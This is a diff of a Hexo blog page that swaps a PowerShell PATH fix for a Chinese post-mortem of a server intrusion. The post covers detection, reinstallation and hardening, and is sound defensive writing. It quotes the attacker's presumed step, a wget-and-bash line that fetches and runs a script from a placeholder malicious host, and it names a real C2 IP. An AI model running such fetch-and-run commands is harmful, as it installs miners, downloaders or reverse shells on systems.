@@ -19,26 +19,27 @@
   <meta name="author" content="Hongxu Li">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前沿 之前本地的Hexo博客突然用不了Hexo命令了，猜测可能是环境变量问题 关键修复 在powershell内运行 1$env:Path +&#x3D; &quot;;C:\Users\34164\AppData\Roaming\npm&quot; 其余可借鉴命令  确认是否安装，及安装位置  npm list -g hexo-cli 案例输出： PS E:\项目\8. My blog\Hexo-blog">
+    <meta name="description" content="前言 最近在维护自己的股票 AI 平台时，我发现服务器出现了一些异常：  网络连接异常增多 CPU 持续跑满 出现未知外联 IP  起初以为只是正常请求，但深入排查后，确认：  ⚠️ 服务器已被入侵，并被植入恶意程序   二、异常现象 1. 可疑外联请求 通过命令： 1ss -antp | grep ESTAB 发现服务器存在持续对外连接： 👉 特征：  非我业务使用的 IP 长连接持续存在 多">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUG修复：hexo命令失效">
-<meta property="og:url" content="https://li-hongxu.github.io/2026/01/31/BUG%E4%BF%AE%E5%A4%8D%EF%BC%9Ahexo%E5%91%BD%E4%BB%A4%E5%A4%B1%E6%95%88/index.html">
+<meta property="og:title" content="一次服务器被入侵的完整复盘：从异常流量到彻底重装">
+<meta property="og:url" content="https://li-hongxu.github.io/2026/04/01/4%E6%9C%881%E6%97%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="白墨">
-<meta property="og:description" content="前沿 之前本地的Hexo博客突然用不了Hexo命令了，猜测可能是环境变量问题 关键修复 在powershell内运行 1$env:Path +&#x3D; &quot;;C:\Users\34164\AppData\Roaming\npm&quot; 其余可借鉴命令  确认是否安装，及安装位置  npm list -g hexo-cli 案例输出： PS E:\项目\8. My blog\Hexo-blog">
+<meta property="og:description" content="前言 最近在维护自己的股票 AI 平台时，我发现服务器出现了一些异常：  网络连接异常增多 CPU 持续跑满 出现未知外联 IP  起初以为只是正常请求，但深入排查后，确认：  ⚠️ 服务器已被入侵，并被植入恶意程序   二、异常现象 1. 可疑外联请求 通过命令： 1ss -antp | grep ESTAB 发现服务器存在持续对外连接： 👉 特征：  非我业务使用的 IP 长连接持续存在 多">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2026-01-31T15:41:22.000Z">
-<meta property="article:modified_time" content="2026-01-31T16:18:15.071Z">
+<meta property="og:image" content="https://li-hongxu.github.io/2026/04/01/4%E6%9C%881%E6%97%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%9B%98/img/d3aec4a484a13f8fa45c07b9ab6c6612.png">
+<meta property="article:published_time" content="2026-03-31T19:33:00.000Z">
+<meta property="article:modified_time" content="2026-04-08T07:40:39.034Z">
 <meta property="article:author" content="Hongxu Li">
-<meta property="article:tag" content="博客">
-<meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Bug">
+<meta property="article:tag" content="运维">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://li-hongxu.github.io/2026/04/01/4%E6%9C%881%E6%97%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%9B%98/img/d3aec4a484a13f8fa45c07b9ab6c6612.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>BUG修复：hexo命令失效 - 白墨</title>
+  <title>一次服务器被入侵的完整复盘：从异常流量到彻底重装 - 白墨</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +216,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="BUG修复：hexo命令失效"></span>
+            <span id="subtitle" data-typed-text="一次服务器被入侵的完整复盘：从异常流量到彻底重装"></span>
           
         </div>
 
@@ -226,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-31 23:41" pubdate>
-          2026年1月31日 晚上
+        <time datetime="2026-04-01 03:33" pubdate>
+          2026年4月1日 凌晨
         </time>
       </span>
     
@@ -238,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          102 字
+          1k 字
         
       </span>
     
@@ -249,7 +250,7 @@
         
         
         
-          1 分钟
+          9 分钟
         
       </span>
     
@@ -286,29 +287,226 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">BUG修复：hexo命令失效</h1>
+            <h1 id="seo-header">一次服务器被入侵的完整复盘：从异常流量到彻底重装</h1>
             
             
               <div class="markdown-body">
                 
-                <h1>前沿</h1>
-<p>之前本地的Hexo博客突然用不了Hexo命令了，猜测可能是环境变量问题</p>
-<h2 id="关键修复">关键修复</h2>
-<p>在powershell内运行</p>
-<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">$env:Path <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;;C:<span class="hljs-char escape_">\U</span>sers<span class="hljs-char escape_">\3</span>4164<span class="hljs-char escape_">\A</span>ppData<span class="hljs-char escape_">\R</span>oaming<span class="hljs-char escape_">\n</span>pm&quot;</span><br></code></pre></td></tr></table></figure>
-<h2 id="其余可借鉴命令">其余可借鉴命令</h2>
+                <h1>前言</h1>
+<p>最近在维护自己的股票 AI 平台时，我发现服务器出现了一些异常：</p>
+<ul>
+<li>网络连接异常增多</li>
+<li>CPU 持续跑满</li>
+<li>出现未知外联 IP</li>
+</ul>
+<p>起初以为只是正常请求，但深入排查后，确认：</p>
+<blockquote>
+<p>⚠️ 服务器已被入侵，并被植入恶意程序</p>
+</blockquote>
+<hr>
+<h1>二、异常现象</h1>
+<h2 id="1-可疑外联请求">1. 可疑外联请求</h2>
+<p>通过命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ss -antp | grep ESTAB<br></code></pre></td></tr></table></figure>
+<p>发现服务器存在持续对外连接：</p>
+<p>👉 特征：</p>
+<ul>
+<li>非我业务使用的 IP</li>
+<li>长连接持续存在</li>
+<li>多个端口异常通信</li>
+</ul>
+<p><img src="img/d3aec4a484a13f8fa45c07b9ab6c6612.png" srcset="/img/loading.gif" lazyload alt="CPU跑满"></p>
+<hr>
+<h2 id="2-异常进程：wget-疯狂外连">2. 异常进程：wget 疯狂外连</h2>
+<p>进一步排查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsof -nP -iTCP -sTCP:SYN_SENT<br></code></pre></td></tr></table></figure>
+<p>发现：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> postgres -&gt; <span class="hljs-number">80.64.16.241:80</span><br></code></pre></td></tr></table></figure>
+<p>👉 关键点：</p>
+<ul>
+<li>由 <code>postgres</code> 用户发起</li>
+<li>使用 <code>wget</code>（典型下载器行为）</li>
+<li>大量 <code>SYN_SENT</code>（说明在疯狂尝试连接）</li>
+</ul>
+<p>这基本可以判断：</p>
+<blockquote>
+<p>服务器已被植入“下载器型木马”</p>
+</blockquote>
+<hr>
+<h2 id="3-防火墙异常行为">3. 防火墙异常行为</h2>
+<p>尝试封禁恶意 IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw deny out to 80.64.16.241<br></code></pre></td></tr></table></figure>
+<p>但问题是：</p>
+<blockquote>
+<p>❗ 攻击仍在持续</p>
+</blockquote>
+<p>说明：</p>
+<ul>
+<li>恶意程序在不断尝试新连接</li>
+<li>或存在多个控制节点（C2）</li>
+</ul>
+<hr>
+<h1>三、初步判断攻击类型</h1>
+<p>综合现象，可以推断这不是普通扫描，而是：</p>
+<blockquote>
+<p>👉 一次典型的云服务器入侵链</p>
+</blockquote>
+<h3 id="攻击路径（推测）">攻击路径（推测）</h3>
 <ol>
-<li>确认是否安装，及安装位置</li>
+<li>开放端口暴露（高概率是 SSH 或数据库）</li>
+<li>被扫描 + 弱口令 / 漏洞利用</li>
 </ol>
-<p>npm list -g hexo-cli</p>
-<p>案例输出：</p>
-<p>PS E:\项目\8. My blog\Hexo-blog\hexo&gt; npm list -g hexo-cli<br>
-C:\Users\34164\AppData\Roaming\npm<br>
-└── hexo-cli@4.3.2</p>
-<ol start="2">
-<li>确认hexo是否可用</li>
-</ol>
-<p>hexo -v</p>
+<p>入侵后执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://恶意地址/xxx.sh<br>bash xxx.sh<br></code></pre></td></tr></table></figure>
+<p>植入程序：</p>
+<ul>
+<li>挖矿程序（xmrig 类）</li>
+<li>下载器（持续拉 payload）</li>
+<li>反弹 shell（控制服务器）</li>
+</ul>
+<hr>
+<h1>四、为什么杀毒没查出来？</h1>
+<p>我运行了杀毒工具（如 ClamAV）：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Infected</span> files: <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>但实际上：</p>
+<blockquote>
+<p>👉 这类攻击通常查不出来</p>
+</blockquote>
+<h3 id="原因：">原因：</h3>
+<ul>
+<li>使用“无文件攻击”或临时脚本</li>
+<li>二进制文件伪装</li>
+<li>进程驻留内存</li>
+<li>非病毒签名库覆盖范围</li>
+</ul>
+<hr>
+<h1>五、关键风险点分析</h1>
+<p>这次事件暴露了几个致命问题：</p>
+<h2 id="1-出口流量未限制">1. 出口流量未限制</h2>
+<p>服务器可以自由访问外网：</p>
+<p>👉 攻击者可以：</p>
+<ul>
+<li>下载恶意程序</li>
+<li>建立反向连接</li>
+</ul>
+<hr>
+<h2 id="2-服务权限问题">2. 服务权限问题</h2>
+<p><code>postgres</code> 用户能执行 <code>wget</code>：</p>
+<p>👉 说明：</p>
+<ul>
+<li>权限隔离不严格</li>
+<li>服务账户被利用</li>
+</ul>
+<hr>
+<h2 id="3-端口暴露">3. 端口暴露</h2>
+<p>你当时：</p>
+<ul>
+<li>开了 SSH</li>
+<li>开了数据库端口（5432）</li>
+</ul>
+<p>👉 这是典型攻击入口组合</p>
+<hr>
+<h1>六、应急处理过程</h1>
+<h2 id="Step-1：封禁恶意-IP（临时止血）">Step 1：封禁恶意 IP（临时止血）</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ufw deny out to 80.64.16.241<br></code></pre></td></tr></table></figure>
+<p>效果：有限 ❌</p>
+<hr>
+<h2 id="Step-2：排查进程（确认感染）">Step 2：排查进程（确认感染）</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux<br>lsof<br>ss<br></code></pre></td></tr></table></figure>
+<p>确认存在异常 <code>wget</code> 行为 ✅</p>
+<hr>
+<h2 id="Step-3：决定重装服务器（关键决策）">Step 3：决定重装服务器（关键决策）</h2>
+<p>原因：</p>
+<blockquote>
+<p>一旦 root 或服务被入侵，系统已不可信</p>
+</blockquote>
+<p>👉 正确做法：</p>
+<ul>
+<li>❌ 不要尝试“清理”</li>
+<li>✅ 直接重装</li>
+</ul>
+<hr>
+<h2 id="Step-4：重装前备份">Step 4：重装前备份</h2>
+<p>重点备份：</p>
+<ul>
+<li>项目代码</li>
+<li><code>docker-compose.yml</code></li>
+<li><code>.env</code></li>
+<li>nginx 配置</li>
+<li>SSL证书（<code>/etc/letsencrypt</code>）</li>
+</ul>
+<hr>
+<h2 id="Step-5：清空-重建">Step 5：清空 &amp; 重建</h2>
+<ul>
+<li>重装系统</li>
+<li>重新部署服务</li>
+<li>更新所有密码</li>
+</ul>
+<hr>
+<h1>七、复盘：这次攻击的本质</h1>
+<p>这不是一次“高级攻击”，而是：</p>
+<blockquote>
+<p>💀 自动化批量扫机 + 弱防护服务器</p>
+</blockquote>
+<p>攻击者只是：</p>
+<ul>
+<li>扫描 IP</li>
+<li>找开放端口</li>
+<li>自动植入脚本</li>
+<li>批量控制</li>
+</ul>
+<p>你只是：</p>
+<blockquote>
+<p>👉 “被扫到的其中一个”</p>
+</blockquote>
+<hr>
+<h1>八、如何避免下一次？</h1>
+<h2 id="✅-必做安全措施">✅ 必做安全措施</h2>
+<h3 id="1-SSH-防护">1. SSH 防护</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 禁用密码登录</span><br>PasswordAuthentication no<br><br><span class="hljs-comment"># 修改端口</span><br>Port 51582<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="2-数据库不要公网开放">2. 数据库不要公网开放</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">listen_addresses = <span class="hljs-string">&#x27;localhost&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>或只允许指定 IP</p>
+<hr>
+<h3 id="3-限制服务器“出网”">3. 限制服务器“出网”</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ufw default deny outgoing<br>ufw allow out 80<br>ufw allow out 443<br></code></pre></td></tr></table></figure>
+<hr>
+<h3 id="4-最小权限原则">4. 最小权限原则</h3>
+<ul>
+<li>服务用户不能执行 shell</li>
+<li>不要用 root 跑服务</li>
+</ul>
+<hr>
+<h3 id="5-安装安全工具">5. 安装安全工具</h3>
+<ul>
+<li>fail2ban</li>
+<li>rkhunter</li>
+<li>chkrootkit</li>
+</ul>
+<hr>
+<h3 id="6-定期巡检">6. 定期巡检</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ss -antp<br>ps aux<br></code></pre></td></tr></table></figure>
+<hr>
+<h1>九、一些经验总结</h1>
+<p>这次让我意识到一个很重要的事情：</p>
+<blockquote>
+<p>服务器安全不是“可选项”，而是“默认前提”</p>
+</blockquote>
+<p>尤其是做产品的人，很容易忽视：</p>
+<ul>
+<li>只关注业务逻辑</li>
+<li>忽略基础设施安全</li>
+</ul>
+<p>但现实是：</p>
+<blockquote>
+<p>只要你暴露在公网，就一定会被扫</p>
+</blockquote>
+<hr>
+<h1>十、最后</h1>
+<p>这次攻击没有造成数据损失，算是一次“学费不贵但很关键”的教训。</p>
+<p>如果你也在用云服务器，一句话送给你：</p>
+<p>“你不是会不会被攻击，而是什么时候被攻击”</p>
 
                 
               </div>
@@ -342,11 +540,9 @@ C:\Users\34164\AppData\Roaming\npm<br>
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%8D%9A%E5%AE%A2/" class="print-no-link">#博客</a>
-      
-        <a href="/tags/Hexo/" class="print-no-link">#Hexo</a>
-      
         <a href="/tags/Bug/" class="print-no-link">#Bug</a>
+      
+        <a href="/tags/%E8%BF%90%E7%BB%B4/" class="print-no-link">#运维</a>
       
     </div>
   
@@ -358,8 +554,8 @@ C:\Users\34164\AppData\Roaming\npm<br>
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>BUG修复：hexo命令失效</div>
-      <div>https://li-hongxu.github.io/2026/01/31/BUG修复：hexo命令失效/</div>
+      <div>一次服务器被入侵的完整复盘：从异常流量到彻底重装</div>
+      <div>https://li-hongxu.github.io/2026/04/01/4月1日服务器入侵事件复盘/</div>
     </div>
     <div class="license-meta">
       
@@ -371,7 +567,7 @@ C:\Users\34164\AppData\Roaming\npm<br>
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年1月31日</div>
+          <div>2026年4月1日</div>
         </div>
       
       
@@ -415,18 +611,12 @@ C:\Users\34164\AppData\Roaming\npm<br>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/03/10/BUG%E4%BF%AE%E5%A4%8D%EF%BC%9ADocker%E9%95%9C%E5%83%8F%E5%A4%B1%E6%95%88/" title="BUG修复：Docker镜像失效">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUG修复：Docker镜像失效</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/10/06/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8E%9F%E7%90%86%E6%8E%A8%E5%AF%BC/" title="损失函数的优化之路：从闭式解到梯度下降">
-                        <span class="hidden-mobile">损失函数的优化之路：从闭式解到梯度下降</span>
+                      <a href="/2026/03/13/Bug%E4%BF%AE%E5%A4%8D%EF%BC%9AFastapi%E7%94%9F%E6%88%90%E6%96%87%E6%A1%A3%E6%89%93%E5%BC%80%E6%98%AF%E7%A9%BA%E7%99%BD/" title="Bug修复：Fastapi生成文档打开是空白">
+                        <span class="hidden-mobile">Bug修复：Fastapi生成文档打开是空白</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
